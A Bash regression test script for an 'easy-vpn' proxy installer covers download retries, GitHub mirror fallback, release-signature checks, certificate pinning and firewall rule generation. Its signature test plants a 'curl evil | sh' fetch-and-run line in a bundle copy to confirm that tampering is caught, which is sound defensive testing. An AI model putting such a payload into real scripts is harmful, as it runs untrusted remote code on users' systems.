#!/usr/bin/env bash
set -Eeuo pipefail
ROOT="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
fail() { echo "FAIL: $*" >&2; exit 1; }
[[ ${EUID} -eq 0 ]] || fail "请使用 root 权限运行冒烟测试（脚本需要加载与安装器相同的 root-only 模块）"

for file in "$ROOT/install.sh" "$ROOT/lib/common.sh" "$ROOT/modules/protocol.sh"; do
    bash -n "$file" || fail "Bash syntax: $file"
done
jq empty "$ROOT/protocol_catalog.json" || fail "protocol catalog JSON"
[[ "$(cat "$ROOT/VERSION")" == "$(grep -m1 '^CURRENT_VERSION=' "$ROOT/install.sh" | cut -d'"' -f2)" ]] || fail "VERSION/install version mismatch"
[[ "$(cat "$ROOT/VERSION")" == "$(jq -r '.tool_version' "$ROOT/protocol_catalog.json")" ]] || fail "VERSION/catalog version mismatch"
grep -Fq "**版本：$(cat "$ROOT/VERSION")**" "$ROOT/README.md" || fail "README version mismatch"

# Regression: curl | bash runs with no BASH_SOURCE[0]; strict nounset must not abort.
stdin_source_result=$(printf '%s\n' \
  'set -Eeuo pipefail' \
  'script_source="${BASH_SOURCE[0]-}"' \
  'err_source="${BASH_SOURCE[1]-}"' \
  '[[ -n "$err_source" ]] || err_source="${BASH_SOURCE[0]-main}"' \
  '[[ -z "$script_source" && "$err_source" == main ]]' | bash) || fail "stdin bootstrap BASH_SOURCE fallback failed"
grep -Fq 'SCRIPT_SOURCE="${BASH_SOURCE[0]-}"' "$ROOT/install.sh" || fail "installer still indexes BASH_SOURCE unsafely"
grep -Fq '[[ -z "$current_script_path" || "$current_script_path" != "$local_install_path" ]]' "$ROOT/install.sh" || fail "stdin bootstrap does not force durable local install"
stdin_trap_output=$(printf '%s\n' \
  'set -Eeuo pipefail' \
  'on_error() { local rc=$?; local err_source="${BASH_SOURCE[1]-}"; [[ -n "$err_source" ]] || err_source="${BASH_SOURCE[0]-main}"; local err_line="${BASH_LINENO[0]-0}"; printf "trap=%s:%s\n" "$err_source" "$err_line"; return "$rc"; }' \
  'trap on_error ERR' \
  'false' | bash 2>&1 || true)
grep -Fq 'trap=main:' <<< "$stdin_trap_output" || fail "ERR trap still fails when BASH_SOURCE is unset"

for module in security apps optimize ip_test; do
    [[ ! -e "$ROOT/modules/${module}.sh" ]] || fail "unrelated module included: ${module}.sh"
done
! grep -q 'VPS 综合运维与网络代理工具箱' "$ROOT/install.sh" || fail "generic toolbox menu must not exist"
grep -q '当前系统没有 sudo' "$ROOT/install.sh" || fail "root-friendly missing-sudo error message missing"
grep -q '^protocol_menu()' "$ROOT/modules/protocol.sh" || fail "protocol menu missing"
grep -q '^show_easy_vpn_summary()' "$ROOT/modules/protocol.sh" || fail "resource summary missing"
grep -q 'MemTotal:' "$ROOT/modules/protocol.sh" || fail "total memory probe missing"
grep -q 'MemAvailable:' "$ROOT/modules/protocol.sh" || fail "available memory probe missing"
grep -q 'df -Pm /' "$ROOT/modules/protocol.sh" || fail "root filesystem probe missing"
grep -q 'raw.githubusercontent.com/%s/%s/%s' "$ROOT/install.sh" || fail "branch URL helper missing"
grep -Fq 'https://gh-proxy.org/%s' "$ROOT/install.sh" || fail "domestic GitHub acceleration URL helper missing"
grep -Fq 'EASY_VPN_GITHUB_SOURCE_MODE=china' "$ROOT/README.md" || fail "README domestic one-click install missing"
grep -Fq 'curl -fsSL "https://raw.githubusercontent.com/yesok6/easy-vpn/main/install.sh" | bash' "$ROOT/README.md" || fail "README root one-click install missing"
grep -Fq 'curl -fsSL "https://raw.githubusercontent.com/yesok6/easy-vpn/main/install.sh" | sudo bash' "$ROOT/README.md" || fail "README non-root sudo install missing"
! grep -Eq '你的用户名|你的仓库|EASY_VPN_GITHUB_USER=|EASY_VPN_GITHUB_REPO=' "$ROOT/README.md" || fail "README still asks users to configure repository owner/name"
grep -q 'EASY_VPN_SHORTCUT:-/usr/local/bin/vpn' "$ROOT/install.sh" || fail "vpn shortcut default missing"
grep -Fq 'EASY_VPN_UPPERCASE_SHORTCUT:-${SHORTCUT%/*}/VPN' "$ROOT/install.sh" || fail "uppercase VPN shortcut missing"
grep -Fq 'install_uppercase_shortcut' "$ROOT/install.sh" || fail "uppercase VPN shortcut installation call missing"
grep -Fq '下次可输入 VPN 快捷打开' "$ROOT/modules/protocol.sh" || fail "green main-menu shortcut hint missing"
grep -Fq '快捷启动：下次打开终端输入 VPN（或 vpn）' "$ROOT/modules/protocol.sh" || fail "summary shortcut hint missing"
grep -q 'remote-version' "$ROOT/modules/protocol.sh" || fail "explicit remote VERSION check missing"
grep -q 'implemented == true' "$ROOT/modules/protocol.sh" || fail "unimplemented protocols must not be offered as available"
grep -q 'modules/protocol.sh' "$ROOT/install.sh" || fail "protocol sync missing"
! grep -q 'modules/security.sh' "$ROOT/install.sh" || fail "installer still syncs security module"
grep -q '1. 更新到最新版' "$ROOT/modules/protocol.sh" || fail "update choice missing"
grep -q '2. 重装当前最新版' "$ROOT/modules/protocol.sh" || fail "reinstall choice missing"
grep -q '自动回滚' "$ROOT/install.sh" || fail "automatic rollback protection missing"
grep -q '版本保护' "$ROOT/install.sh" || fail "anti-downgrade protection missing"
grep -q '^firewall_rule_exists()' "$ROOT/lib/common.sh" || fail "firewall_rule_exists is missing"
grep -q '^firewall_open_port_entries()' "$ROOT/lib/common.sh" || fail "firewall_open_port_entries is missing"

# Regression tests for the six reviewed issues.
regression_test=$(mktemp -d /tmp/easy-vpn-regression.XXXXXX)
trap 'rm -rf -- "${regression_test:-}"' EXIT

# download_https: long timeout, HTTP Range resume, fallback if Range is unsupported,
# and no partial file left behind after repeated failures.
download_https_function="${regression_test}/download-https.sh"
sed -n '/^download_https()/,/^}/p' "$ROOT/lib/common.sh" > "$download_https_function"
[[ -s "$download_https_function" ]] || fail "download_https function extraction failed"
mkdir -p "${regression_test}/download-https-bin"
cat > "${regression_test}/download-https-bin/curl" <<'MOCK_DOWNLOAD_HTTPS_CURL'
#!/usr/bin/env bash
set -u
out="" url="" resume=0 max_time="" connect_timeout="" speed_limit="" speed_time=""
while (($#)); do
    case "$1" in
        --output|-o) out="${2:-}"; shift 2 ;;
        --continue-at|-C) [[ "${2:-}" == "-" ]] || exit 90; resume=1; shift 2 ;;
        --max-time) max_time="${2:-}"; shift 2 ;;
        --connect-timeout) connect_timeout="${2:-}"; shift 2 ;;
        --speed-limit) speed_limit="${2:-}"; shift 2 ;;
        --speed-time) speed_time="${2:-}"; shift 2 ;;
        --proto) shift 2 ;;
        --fail|--silent|--show-error|--location|--tlsv1.2) shift ;;
        https://*) url="$1"; shift ;;
        *) shift ;;
    esac
done
[[ -n "$out" && "$url" == https://mock.example/* ]] || { echo "bad mock curl args" >&2; exit 91; }
[[ "$max_time" == 600 && "$connect_timeout" == 15 && "$speed_limit" == 1024 && "$speed_time" == 120 ]] || { echo "download timeout policy missing" >&2; exit 92; }
state="${MOCK_CURL_STATE:?}"
count=0; [[ ! -f "$state" ]] || count="$(cat "$state")"
count=$((count + 1)); printf '%s' "$count" > "$state"
case "${MOCK_CURL_MODE:-resume}" in
    resume)
        [[ "$resume" == 1 ]] || { echo "resume flag missing on retry" >&2; exit 93; }
        if (( count == 1 )); then printf '%s' 'partial-' > "$out"; exit 28; fi
        [[ "$(cat "$out")" == 'partial-' ]] || { echo "partial data was not retained for resume" >&2; exit 94; }
        printf '%s' 'complete' >> "$out"
        exit 0
        ;;
    range_unsupported)
        if (( resume )); then exit 33; fi
        printf '%s' 'complete-download' > "$out"
        exit 0
        ;;
    fail)
        printf '%s' 'partial-data' > "$out"
        exit 28
        ;;
    *) exit 95 ;;
esac
MOCK_DOWNLOAD_HTTPS_CURL
cat > "${regression_test}/download-https-bin/sleep" <<'MOCK_DOWNLOAD_SLEEP'
#!/usr/bin/env bash
exit 0
MOCK_DOWNLOAD_SLEEP
chmod 755 "${regression_test}/download-https-bin/curl" "${regression_test}/download-https-bin/sleep"

resume_dest="${regression_test}/resume-output.bin"
MOCK_CURL_MODE=resume MOCK_CURL_STATE="${regression_test}/resume-state" \
    PATH="${regression_test}/download-https-bin:$PATH" \
    bash -c 'RED=red; PLAIN=plain; source "$1"; download_https https://mock.example/asset "$2"' \
    _ "$download_https_function" "$resume_dest" >/dev/null 2>&1 || fail "download_https resume retry failed"
[[ "$(cat "$resume_dest")" == 'partial-complete' ]] || fail "download_https did not resume the partial transfer"
[[ "$(cat "${regression_test}/resume-state")" == 2 ]] || fail "download_https resume retry count incorrect"

range_dest="${regression_test}/range-fallback.bin"
MOCK_CURL_MODE=range_unsupported MOCK_CURL_STATE="${regression_test}/range-state" \
    PATH="${regression_test}/download-https-bin:$PATH" \
    bash -c 'RED=red; PLAIN=plain; source "$1"; download_https https://mock.example/asset "$2"' \
    _ "$download_https_function" "$range_dest" >/dev/null 2>&1 || fail "download_https full-download fallback failed when Range is unsupported"
[[ "$(cat "$range_dest")" == 'complete-download' ]] || fail "download_https Range fallback content incorrect"
[[ "$(cat "${regression_test}/range-state")" == 2 ]] || fail "download_https Range fallback did not retry exactly once"

fail_dest="${regression_test}/failed-output.bin"
if MOCK_CURL_MODE=fail MOCK_CURL_STATE="${regression_test}/fail-state" \
    PATH="${regression_test}/download-https-bin:$PATH" \
    bash -c 'RED=red; PLAIN=plain; source "$1"; download_https https://mock.example/asset "$2"' \
    _ "$download_https_function" "$fail_dest" >/dev/null 2>&1; then
    fail "download_https unexpectedly succeeded when all transfers fail"
fi
[[ ! -e "$fail_dest" ]] || fail "download_https left a partial file at the final destination"
shopt -s nullglob
leftover_parts=("${regression_test}/failed-output.bin.part."*)
shopt -u nullglob
(( ${#leftover_parts[@]} == 0 )) || fail "download_https left temporary partial files after failure"

# Domestic-source mode builds the expected proxy prefix and persists for future shortcut runs.
url_functions="${regression_test}/url-functions.sh"
sed -n '/^raw_direct_base_url()/,/^}/p; /^raw_base_url()/,/^}/p' "$ROOT/install.sh" > "$url_functions"
url_result=$(EASY_VPN_GITHUB_SOURCE_MODE=china GITHUB_USER=yesok6 GITHUB_REPO=easy-vpn EASY_VPN_BRANCH=main \
    bash -c 'source "$1"; raw_base_url' _ "$url_functions") || fail "domestic source URL function failed"
[[ "$url_result" == 'https://gh-proxy.org/https://raw.githubusercontent.com/yesok6/easy-vpn/main' ]] || fail "domestic source URL incorrect: $url_result"
mode_functions="${regression_test}/mode-functions.sh"
sed -n '/^proxy_unsigned_consent_saved()/,/^}/p; /^save_proxy_unsigned_consent()/,/^}/p; /^persist_github_source_mode()/,/^}/p; /^configure_github_source_mode()/,/^}/p' "$ROOT/install.sh" > "$mode_functions"
mkdir -p "${regression_test}/mode-conf"
LOG_DIR="${regression_test}/mode-conf" bash -c '
    set -Eeuo pipefail
    GITHUB_SOURCE_MODE_FILE="$LOG_DIR/github-source-mode"
    PROXY_CONSENT_FILE="$LOG_DIR/allow-unsigned-proxy"
    log_action() { :; }; RED=red; YELLOW=yellow; PLAIN=plain
    EASY_VPN_RELEASE_PUBKEY=""
    source "$1"
    # An unconfirmed explicit request must fail before persisting china mode.
    if EASY_VPN_GITHUB_SOURCE_MODE=china configure_github_source_mode >/dev/null 2>&1; then exit 11; fi
    [[ ! -e "$GITHUB_SOURCE_MODE_FILE" ]] || exit 12
    # Explicit consent stores a root-only record and mode for later menu-triggered updates.
    EASY_VPN_ALLOW_UNSIGNED_PROXY=1 EASY_VPN_GITHUB_SOURCE_MODE=china configure_github_source_mode
    [[ "$(cat "$GITHUB_SOURCE_MODE_FILE")" == china ]]
    [[ "$(cat "$PROXY_CONSENT_FILE")" == yes && "$(stat -c %a "$PROXY_CONSENT_FILE")" == 600 ]]
    # The stored opt-in must also permit an explicitly selected source on later runs.
    unset EASY_VPN_ALLOW_UNSIGNED_PROXY
    EASY_VPN_GITHUB_SOURCE_MODE=china configure_github_source_mode
    unset EASY_VPN_GITHUB_SOURCE_MODE
    configure_github_source_mode
    [[ "$EASY_VPN_GITHUB_SOURCE_MODE" == china ]]
    # Switching to official source revokes the opt-in.
    EASY_VPN_GITHUB_SOURCE_MODE=direct configure_github_source_mode
    [[ "$(cat "$GITHUB_SOURCE_MODE_FILE")" == direct && ! -e "$PROXY_CONSENT_FILE" ]]
    # Repair a stale china setting from an older release that never saved consent.
    printf "china\n" > "$GITHUB_SOURCE_MODE_FILE"
    unset EASY_VPN_GITHUB_SOURCE_MODE EASY_VPN_ALLOW_UNSIGNED_PROXY
    configure_github_source_mode
    [[ "$EASY_VPN_GITHUB_SOURCE_MODE" == direct && "$(cat "$GITHUB_SOURCE_MODE_FILE")" == direct ]]
' _ "$mode_functions" || fail "domestic source mode persistence/safety failed"

# A failed GH-Proxy bundle request must fall back to the official Raw URL.
download_functions="${regression_test}/download-functions.sh"
sed -n '/^download_bundle_file()/,/^}/p' "$ROOT/install.sh" > "$download_functions"
[[ -s "$download_functions" ]] || fail "download_bundle_file function extraction failed"
grep -Fq -- '--max-time 600' "$download_functions" || fail "bootstrap bundle download timeout remains too short"
grep -Fq -- '--continue-at -' "$download_functions" || fail "bootstrap bundle download resume is missing"
grep -Fq -- '--speed-limit 1024 --speed-time 120' "$download_functions" || fail "bootstrap download low-speed guard missing"
mkdir -p "${regression_test}/download-mockbin"
cat > "${regression_test}/download-mockbin/curl" <<'MOCK_ACCEL_CURL'
#!/usr/bin/env bash
out=""; url=""
while (($#)); do
    case "$1" in
        -o|--output) out="${2:-}"; shift 2 ;;
        http://*|https://*) url="$1"; shift ;;
        *) shift ;;
    esac
done
case "$url" in
    https://gh-proxy.org/*) exit 7 ;;
    https://raw.githubusercontent.com/yesok6/easy-vpn/main/VERSION*) printf '1.0.14\n' > "$out" ;;
    *) echo "unexpected fallback URL: $url" >&2; exit 8 ;;
esac
MOCK_ACCEL_CURL
chmod 755 "${regression_test}/download-mockbin/curl"
EASY_VPN_GITHUB_SOURCE_MODE=china PATH="${regression_test}/download-mockbin:$PATH" \
    bash -c 'source "$1"; YELLOW=yellow; PLAIN=plain; download_bundle_file "https://gh-proxy.org/https://raw.githubusercontent.com/yesok6/easy-vpn/main" "https://raw.githubusercontent.com/yesok6/easy-vpn/main" VERSION "$2"' \
    _ "$download_functions" "${regression_test}/downloaded-version" >/dev/null 2>&1 || fail "bundle direct fallback failed"
[[ "$(cat "${regression_test}/downloaded-version")" == "1.0.14" ]] || fail "bundle fallback content incorrect"

# Protocol update source helper must also use proxy first and direct Raw fallback.
module_url_functions="${regression_test}/module-url-functions.sh"
sed -n '/^easy_vpn_project_raw_url()/,/^}/p; /^easy_vpn_project_direct_raw_url()/,/^}/p; /^fetch_easy_vpn_project_file()/,/^}/p' "$ROOT/modules/protocol.sh" > "$module_url_functions"
cat > "${regression_test}/download-mockbin/curl" <<'MOCK_MODULE_ACCEL_CURL'
#!/usr/bin/env bash
out=""; url=""
while (($#)); do
    case "$1" in
        -o|--output) out="${2:-}"; shift 2 ;;
        http://*|https://*) url="$1"; shift ;;
        *) shift ;;
    esac
done
case "$url" in
    https://gh-proxy.org/*) exit 7 ;;
    https://raw.githubusercontent.com/yesok6/easy-vpn/main/protocol_catalog.json) printf '{"schema_version":1,"tool_version":"1.0.14","protocols":[]}\n' > "$out" ;;
    *) echo "unexpected module fallback URL: $url" >&2; exit 9 ;;
esac
MOCK_MODULE_ACCEL_CURL
chmod 755 "${regression_test}/download-mockbin/curl"
EASY_VPN_GITHUB_SOURCE_MODE=china PROTOCOL_BRANCH=main PATH="${regression_test}/download-mockbin:$PATH" \
    bash -c 'source "$1"; YELLOW=yellow; PLAIN=plain; fetch_easy_vpn_project_file "$(easy_vpn_project_raw_url protocol_catalog.json)" "$(easy_vpn_project_direct_raw_url protocol_catalog.json)" "$2"' \
    _ "$module_url_functions" "${regression_test}/module-catalog.json" >/dev/null 2>&1 || fail "protocol source direct fallback failed"
jq -e '.tool_version == "1.0.14"' "${regression_test}/module-catalog.json" >/dev/null || fail "protocol source fallback content invalid"

# 8a. Release signing: remote bundles must match a signed SHA256SUMS; the third-party proxy needs a signing key.
bash -n "$ROOT/tools/release.sh" || fail "tools/release.sh syntax"
grep -Fq '# >>> EASY_VPN_RELEASE_PUBKEY >>>' "$ROOT/install.sh" || fail "release public-key block missing"
grep -Fq 'verify_bundle_signature "$temp" "${rels[@]}"' "$ROOT/install.sh" || fail "remote sync does not verify the release signature"
grep -Fq 'require_verifiable_remote_source || return 1' "$ROOT/install.sh" || fail "proxy gate missing in remote sync"
sign_test="${regression_test}/sign"
mkdir -p "$sign_test/bundle/lib" "$sign_test/bundle/modules"
sed -n '/^proxy_unsigned_consent_saved()/,/^}/p; /^require_verifiable_remote_source()/,/^}/p; /^verify_bundle_signature()/,/^}/p' "$ROOT/install.sh" > "$sign_test/functions.sh"
openssl ecparam -name prime256v1 -genkey -noout -out "$sign_test/key.pem" 2>/dev/null
openssl ec -in "$sign_test/key.pem" -pubout -out "$sign_test/pub.pem" 2>/dev/null
openssl ecparam -name prime256v1 -genkey -noout -out "$sign_test/other.pem" 2>/dev/null
openssl ec -in "$sign_test/other.pem" -pubout -out "$sign_test/other-pub.pem" 2>/dev/null
printf '#!/bin/sh\n' > "$sign_test/bundle/install.sh"; printf 'a\n' > "$sign_test/bundle/lib/common.sh"
printf 'b\n' > "$sign_test/bundle/modules/protocol.sh"; printf '{}\n' > "$sign_test/bundle/protocol_catalog.json"; printf '9.9.9\n' > "$sign_test/bundle/VERSION"
(cd "$sign_test/bundle" && sha256sum install.sh lib/common.sh modules/protocol.sh protocol_catalog.json VERSION > SHA256SUMS)
openssl dgst -sha256 -sign "$sign_test/key.pem" -out "$sign_test/sig.bin" "$sign_test/bundle/SHA256SUMS"
openssl base64 -A -in "$sign_test/sig.bin" -out "$sign_test/bundle/SHA256SUMS.sig"; printf '\n' >> "$sign_test/bundle/SHA256SUMS.sig"
sign_check() {  # $1 = bundle dir, $2 = public key file
    PUBFILE="$2" bash -c '
        set -Eeuo pipefail
        log_action() { :; }; RED=; GREEN=; YELLOW=; PLAIN=
        source "$1"
        EASY_VPN_RELEASE_PUBKEY="$(cat "$PUBFILE")"
        verify_bundle_signature "$2" install.sh lib/common.sh modules/protocol.sh protocol_catalog.json VERSION
    ' _ "$sign_test/functions.sh" "$1"
}
sign_check "$sign_test/bundle" "$sign_test/pub.pem" || fail "genuine signed bundle was rejected"
! sign_check "$sign_test/bundle" "$sign_test/other-pub.pem" || fail "bundle signed by a different key was accepted"
cp -a "$sign_test/bundle" "$sign_test/tampered"; printf 'curl evil | sh\n' >> "$sign_test/tampered/modules/protocol.sh"
! sign_check "$sign_test/tampered" "$sign_test/pub.pem" || fail "tampered file was accepted"
cp -a "$sign_test/bundle" "$sign_test/nosig"; rm -f "$sign_test/nosig/SHA256SUMS.sig"
! sign_check "$sign_test/nosig" "$sign_test/pub.pem" || fail "bundle without signature was accepted"
cp -a "$sign_test/bundle" "$sign_test/swapped"; printf 'evil\n' >> "$sign_test/swapped/VERSION"
evil_hash=$(sha256sum "$sign_test/swapped/VERSION" | awk '{print $1}')
sed -i "s/^[0-9a-f]\{64\}  VERSION\$/${evil_hash}  VERSION/" "$sign_test/swapped/SHA256SUMS"
! sign_check "$sign_test/swapped" "$sign_test/pub.pem" || fail "edited manifest with valid-looking hash was accepted"
gate_check() {  # $1 = mode, $2 = pubkey, $3 = allow-unsigned flag, $4 = optional consent file
    EASY_VPN_GITHUB_SOURCE_MODE="$1" KEY="$2" ALLOW="$3" CONSENT_FILE="${4:-}" bash -c '
        log_action() { :; }; RED=; YELLOW=; PLAIN=
        PROXY_CONSENT_FILE="$CONSENT_FILE"
        source "$1"
        EASY_VPN_RELEASE_PUBKEY="$KEY"
        EASY_VPN_ALLOW_UNSIGNED_PROXY="$ALLOW"
        require_verifiable_remote_source
    ' _ "$sign_test/functions.sh" >/dev/null 2>&1
}
! gate_check china "" 0 || fail "unsigned third-party proxy source was allowed"
gate_check china "" 1 || fail "explicit unsigned-proxy override was ignored"
gate_check china "KEY" 0 || fail "signed proxy source was refused"
gate_check direct "" 0 || fail "official direct source must not need a signing key"
printf 'yes\n' > "$sign_test/consent"; chmod 600 "$sign_test/consent"
gate_check china "" 0 "$sign_test/consent" || fail "persisted explicit proxy consent was not respected for later updates"
# The maintainer tool must produce a bundle that the client check accepts (end to end).
release_test="${sign_test}/release-tree"
mkdir -p "$release_test"; cp -a "$ROOT/install.sh" "$ROOT/VERSION" "$ROOT/protocol_catalog.json" "$ROOT/lib" "$ROOT/modules" "$ROOT/tools" "$release_test/"
EASY_VPN_RELEASE_KEY_DIR="${sign_test}/keys" bash "$release_test/tools/release.sh" init-key >/dev/null || fail "release.sh init-key failed"
EASY_VPN_RELEASE_KEY_DIR="${sign_test}/keys" bash "$release_test/tools/release.sh" release >/dev/null || fail "release.sh release failed"
EASY_VPN_RELEASE_KEY_DIR="${sign_test}/keys" bash "$release_test/tools/release.sh" verify >/dev/null || fail "release.sh verify failed"
printf '# tamper\n' >> "$release_test/modules/protocol.sh"
! EASY_VPN_RELEASE_KEY_DIR="${sign_test}/keys" bash "$release_test/tools/release.sh" verify >/dev/null 2>&1 || fail "release.sh verify accepted a modified file"

# 8b. sing-box binary reuse requires a root-owned, non-group/world-writable binary and directory.
trust_functions="${regression_test}/trust-functions.sh"
sed -n '/^singbox_binary_is_trusted()/,/^}/p' "$ROOT/modules/protocol.sh" > "$trust_functions"
mkdir -p "$regression_test/trust/safe" "$regression_test/trust/open"; chmod 755 "$regression_test/trust" "$regression_test/trust/safe"; chmod 777 "$regression_test/trust/open"
printf '#!/bin/sh\n' > "$regression_test/trust/safe/sing-box"; chmod 755 "$regression_test/trust/safe/sing-box"
cp "$regression_test/trust/safe/sing-box" "$regression_test/trust/open/sing-box"; chmod 755 "$regression_test/trust/open/sing-box"
cp "$regression_test/trust/safe/sing-box" "$regression_test/trust/safe/group-writable"; chmod 775 "$regression_test/trust/safe/group-writable"
bash -c 'source "$1"; singbox_binary_is_trusted "$2"' _ "$trust_functions" "$regression_test/trust/safe/sing-box" || fail "root-owned sing-box was not trusted"
! bash -c 'source "$1"; singbox_binary_is_trusted "$2"' _ "$trust_functions" "$regression_test/trust/open/sing-box" || fail "sing-box in a world-writable directory was trusted"
! bash -c 'source "$1"; singbox_binary_is_trusted "$2"' _ "$trust_functions" "$regression_test/trust/safe/group-writable" || fail "group-writable sing-box was trusted"
grep -Fq 'singbox_binary_is_trusted "$candidate"' "$ROOT/modules/protocol.sh" || fail "resolve_singbox does not vet system sing-box"
grep -Fq 'SINGBOX_VERSION 必须是 X.Y.Z' "$ROOT/modules/protocol.sh" || fail "SINGBOX_VERSION is not validated"

# 8c. Self-signed Hysteria 2 / TUIC certificates are pinned by SHA-256 fingerprint.
pin_functions="${regression_test}/pin-functions.sh"
sed -n '/^cert_sha256_fingerprint()/,/^}/p' "$ROOT/modules/protocol.sh" > "$pin_functions"
openssl req -x509 -nodes -newkey ec -pkeyopt ec_paramgen_curve:prime256v1 -keyout "$regression_test/pin-key.pem" -out "$regression_test/pin-cert.pem" \
    -days 365 -subj "/CN=www.example.com" -addext "subjectAltName=DNS:www.example.com" >/dev/null 2>&1
pin_fp=$(bash -c 'source "$1"; cert_sha256_fingerprint "$2"' _ "$pin_functions" "$regression_test/pin-cert.pem") || fail "certificate fingerprint failed"
pin_expected=$(openssl x509 -in "$regression_test/pin-cert.pem" -outform DER | sha256sum | awk '{print toupper($1)}')
[[ "$pin_fp" == "$pin_expected" ]] || fail "certificate fingerprint does not match SHA-256 of the DER certificate"
grep -Fq 'hy2_link+="&pinSHA256=${cert_fp}"' "$ROOT/modules/protocol.sh" || fail "Hysteria 2 link does not pin the certificate"
grep -Fq '证书指纹 (SHA-256): ${cert_fp:-未能计算}' "$ROOT/modules/protocol.sh" || fail "node info does not show the certificate fingerprint"
[[ $(grep -Fc 'fingerprint: $(yaml_quote "$cert_fp")' "$ROOT/modules/protocol.sh") -eq 2 ]] || fail "Clash export must pin both Hysteria 2 and TUIC"

# 9. Standard ports 80/443 are accepted and systemd grants only the needed bind capability.
EASY_VPN_ROOT="$regression_test/root" EASY_VPN_ETC="$regression_test/etc" \
EASY_VPN_STATE="$regression_test/state" EASY_VPN_BACKUPS="$regression_test/backups" EASY_VPN_LOG="$regression_test/log" \
bash -c '
  source "$1/lib/common.sh"
  validate_port 80 || exit 91
  validate_port 443 || exit 92
  validate_port 1024 || exit 93
  if validate_port 22; then exit 94; fi
  if validate_port 65536; then exit 95; fi
  [[ $(grep -c "AmbientCapabilities=CAP_NET_BIND_SERVICE" "$1/modules/protocol.sh") -ge 2 ]] || exit 96
  [[ $(grep -c "CapabilityBoundingSet=CAP_NET_BIND_SERVICE" "$1/modules/protocol.sh") -ge 2 ]] || exit 97
' _ "$ROOT" || fail "low-port validation/capability regression"

# 10. Hysteria should not use a decade-long certificate or hard-coded CN.
[[ $(grep -Fc 'sni=$(get_best_sni "$sni_mode")' "$ROOT/modules/protocol.sh") -ge 3 ]] || fail "all protocols must use the shared SNI selector"
grep -Fq -- '-days 365 -subj "/CN=${sni}"' "$ROOT/modules/protocol.sh" || fail "Hysteria certificate lifetime/subject incorrect"
! grep -Fq -- '-days 3650' "$ROOT/modules/protocol.sh" || fail "legacy long-lived self-signed certificate remains"


# 1. nftables persistence must use a hyphen for port ranges.
nft_file=$(EASY_VPN_ROOT="$regression_test/root" EASY_VPN_ETC="$regression_test/etc" \
    EASY_VPN_STATE="$regression_test/state" EASY_VPN_BACKUPS="$regression_test/backups" EASY_VPN_LOG="$regression_test/log" \
    bash -c 'source "$1/lib/common.sh"; source "$1/modules/protocol.sh"; write_hop_persistence_file hy2 nft 20000-20100 8443' _ "$ROOT") || fail "nft hop config generation failed"
grep -Fq 'table inet easy_vpn_hop_hy2 {' "$nft_file" || fail "dual-stack nftables table family was not applied"
! find "$regression_test/etc/port-hop" -maxdepth 1 -name '.hy2.nft.*' -print -quit | grep -q . || fail "temporary nft persistence file leaked"
# nft(8) defines redirect as `redirect [to :PORT]`; the colon is valid here.
grep -Fq 'udp dport 20000-20100 redirect to :8443' "$nft_file" || fail "nftables redirect syntax is wrong"
! grep -Fq 'dnat to :' "$nft_file" || fail "nftables local redirect incorrectly uses DNAT without a target address"
if command -v nft >/dev/null 2>&1; then
    nft -c -f "$nft_file" || fail "nftables ruleset failed nft syntax check"
fi
! grep -Fq '20000:20100' "$nft_file" || fail "nftables config contains colon range"
grep -Fq 'vps_tool_hop_${name}' "$ROOT/modules/protocol.sh" || fail "legacy nft table cleanup compatibility missing"

# 2. Multiple stable GitHub releases must resolve to exactly one newest eligible version.
release_version=$(EASY_VPN_ROOT="$regression_test/root" EASY_VPN_ETC="$regression_test/etc" \
    EASY_VPN_STATE="$regression_test/state" EASY_VPN_BACKUPS="$regression_test/backups" EASY_VPN_LOG="$regression_test/log" \
    bash -c '
      source "$1/lib/common.sh"; source "$1/modules/protocol.sh"
      github_release_api_json() { cat <<"JSON"
[{"draft":false,"prerelease":false,"tag_name":"v1.12.0","assets":[{"name":"sing-box-1.12.0-linux-amd64.tar.gz"}]},{"draft":false,"prerelease":false,"tag_name":"v1.11.0","assets":[{"name":"sing-box-1.11.0-linux-amd64.tar.gz"}]}]
JSON
      }
      latest_singbox_version
    ' _ "$ROOT") || fail "latest sing-box version parsing failed"
[[ "$release_version" == "1.12.0" && $(wc -l <<< "$release_version") -eq 1 ]] || fail "latest sing-box version returned multiple/wrong versions"

# 2b. API rate-limit fallback must resolve the latest redirect and still verify the asset digest.
fallback_version=$(EASY_VPN_ROOT="$regression_test/root" EASY_VPN_ETC="$regression_test/etc" \
    EASY_VPN_STATE="$regression_test/state" EASY_VPN_BACKUPS="$regression_test/backups" EASY_VPN_LOG="$regression_test/log" \
    bash -c '
      source "$1/lib/common.sh"; source "$1/modules/protocol.sh"
      uname() { echo x86_64; }
      github_release_api_json() { return 22; }
      curl() {
        local url="" arg; local -a args=("$@"); local i=0
        while (( i < ${#args[@]} )); do
          arg="${args[$i]}"
          if [[ "$arg" == -o || "$arg" == --output || "$arg" == --write-out ]]; then ((i+=2)); continue; fi
          [[ "$arg" == https://* ]] && url="$arg"
          ((i+=1))
        done
        case "$url" in
          */releases/latest) printf "%s\\n" "https://github.com/SagerNet/sing-box/releases/tag/v1.14.3" ;;
          */releases/download/v1.14.3/sing-box-1.14.3-linux-amd64.tar.gz) return 0 ;;
          *) echo "unexpected fallback URL: $url" >&2; return 1 ;;
        esac
      }
      latest_singbox_version
    ' _ "$ROOT") || fail "GitHub Release redirect fallback failed"
[[ "$fallback_version" == "1.14.3" ]] || fail "GitHub Release redirect fallback returned wrong version"
fallback_digest=$(EASY_VPN_ROOT="$regression_test/root" EASY_VPN_ETC="$regression_test/etc" \
    EASY_VPN_STATE="$regression_test/state" EASY_VPN_BACKUPS="$regression_test/backups" EASY_VPN_LOG="$regression_test/log" \
    bash -c '
      source "$1/lib/common.sh"; source "$1/modules/protocol.sh"
      github_release_api_json() { return 22; }
      curl() {
        local url="" out="" arg; local -a args=("$@"); local i=0
        while (( i < ${#args[@]} )); do
          arg="${args[$i]}"
          case "$arg" in -o|--output) out="${args[$((i+1))]}"; ((i+=2)); continue ;; esac
          [[ "$arg" == https://* ]] && url="$arg"
          ((i+=1))
        done
        [[ "$url" == */releases/expanded_assets/v1.14.3 && -n "$out" ]] || { echo "unexpected digest URL: $url" >&2; return 1; }
        printf "%s\\n" "<li><a>sing-box-1.14.3-linux-amd64.tar.gz</a><span>sha256:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span></li>" > "$out"
      }
      fetch_release_asset_digest 1.14.3 sing-box-1.14.3-linux-amd64.tar.gz
    ' _ "$ROOT") || fail "GitHub HTML checksum fallback failed"
